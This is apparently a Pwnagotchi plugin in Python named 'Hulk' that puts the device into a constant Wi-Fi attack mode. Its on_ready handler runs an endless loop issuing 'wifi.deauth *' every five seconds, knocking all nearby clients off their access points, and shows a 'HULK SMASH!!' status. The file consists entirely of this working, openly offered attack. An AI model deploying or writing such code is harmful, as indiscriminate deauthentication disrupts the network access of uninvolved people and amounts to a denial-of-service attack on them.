import json
import logging
import os
from time import sleep
from pwnagotchi import plugins


class Hulk(plugins.Plugin):
    __author__ = '33197631+dadav@users.noreply.github.com'
    __version__ = '1.0.0'
    __license__ = 'GPL3'
    __description__ = 'This will put pwnagotchi in hulk mode. Hulk is always angry!'
    __defaults__ = {
        'enabled': False,
    }

    def __init__(self):
        self.options = dict()
        self.running = False

    def on_loaded(self):
        logging.info('[hulk] PLUGIN IS LOADED! WHAAAAAAAAAAAAAAAAAA')
        self.running = True

    def on_unload(self, ui):
        self.running = False

    def on_ready(self, agent):
        display = agent.view()
        i = 0
        while self.running:
            i += 1
            if i % 10 == 0:
                display.set('status', 'HULK SMASH!!')
            try:
                agent.run('wifi.deauth *')
            except Exception:
                pass
            finally:
                sleep(5)
